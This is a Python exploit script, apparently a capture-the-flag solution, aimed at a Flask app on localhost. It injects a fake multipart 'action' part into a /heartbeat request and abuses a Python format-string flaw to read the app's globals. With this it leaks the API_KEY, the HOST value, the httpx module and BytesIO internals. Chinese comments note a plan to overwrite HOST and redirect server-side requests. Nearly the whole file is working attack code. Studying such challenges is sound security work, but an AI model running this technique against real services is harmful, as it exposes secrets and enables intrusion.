import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 获取 API_KEY
api_key = format_string_leak("{0.view_functions[action].__globals__[API_KEY]}")
print(f"[+] API_KEY: {api_key}")

# 关键发现：
# 1. heartbeat 中 httpx.post 会发送请求到 http://{HOST}/action
# 2. HOST 是从全局变量读取的
# 3. 如果我能修改 HOST...

# 让我看看 HOST 的值
host = format_string_leak("{0.view_functions[action].__globals__[HOST]}")
print(f"[+] HOST: {host}")

# 检查 httpx 模块的一些属性
httpx_info = format_string_leak("{0.view_functions[action].__globals__[httpx]}")
print(f"[+] httpx: {httpx_info}")

# 检查 httpx 的 _client
httpx_client = format_string_leak("{0.view_functions[action].__globals__[httpx]._client}")
print(f"[+] httpx._client: {httpx_client}")

# 让我尝试看 BytesIO 的属性
bytesio = format_string_leak("{0.view_functions[action].__globals__[BytesIO].__dict__}")
print(f"[+] BytesIO.__dict__: {bytesio[:500]}")
